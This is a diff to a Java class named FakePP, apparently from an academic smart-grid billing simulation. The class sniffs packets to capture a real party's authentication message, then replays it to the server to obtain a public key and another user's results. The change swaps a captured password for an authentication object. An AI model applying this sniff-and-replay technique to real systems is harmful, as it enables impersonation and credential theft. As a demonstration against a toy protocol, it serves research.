@@ -1,5 +1,6 @@
 package SmartGridBillingSenario.attack;
 
+import SmartGridBillingSenario.message.AuthenticationMessage;
 import SmartGridBillingSenario.message.Message;
 import SmartGridBillingSenario.message.MessageType;
 import SmartGridBillingSenario.message.QuoteAndRateResponseMessage;
@@ -20,11 +21,10 @@ import static SmartGridBillingSenario.utils.Utils.getTcpValue;
 
 /**
  * Created by yuandai on 4/10/17.
- *
- *
+ * <p>
+ * <p>
  * Replay attack, FakePP capture the Real PP Authentication, resend the get public key request to TRE,
  * and pass the authentication, get result for User JACK.
- *
  */
 @Slf4j
 public class FakePP extends Pcap4j {
@@ -34,9 +34,9 @@ public class FakePP extends Pcap4j {
 
     private int fakePPPort;
 
-    private FakePPClient fakePPClient;
+    private AuthenticationMessage authenticationMessage;
 
-    private String password;
+    private FakePPClient fakePPClient;
 
     public FakePP(String clientHost, int serverPort) {
         super(clientHost);
@@ -59,8 +59,8 @@ public class FakePP extends Pcap4j {
                 try {
                     Message message = Utils.stringToMessage(value);
                     if (message.getMessageType().equals(MessageType.ATTESTATION_REQUEST)) {
-                        password = String.valueOf(message.getObject());
-                        log.info("Get Real PP Password {}, can start Replace Attack", password);
+                        authenticationMessage = AuthenticationMessage.fromMessage(message);
+                        log.info("Get Real PP Authentication {}, can start Replace Attack", authenticationMessage);
                         startAttack();
                     }
                 } catch (Exception e) {
@@ -95,7 +95,7 @@ public class FakePP extends Pcap4j {
         private byte[] getPublicKey() throws JsonProcessingException {
             log.info("Get Public Key!!");
             ObjectMapper mapper = new ObjectMapper();
-            String jsonInString = mapper.writeValueAsString(new Message(MessageType.ATTESTATION_REQUEST, password));
+            String jsonInString = mapper.writeValueAsString(new Message(MessageType.ATTESTATION_REQUEST, authenticationMessage));
             Message responseForPublicKey = sendToPort(jsonInString);
             fakePPPort = this.clientPort;
             return Base64.decodeBase64(String.valueOf(responseForPublicKey.getObject()));
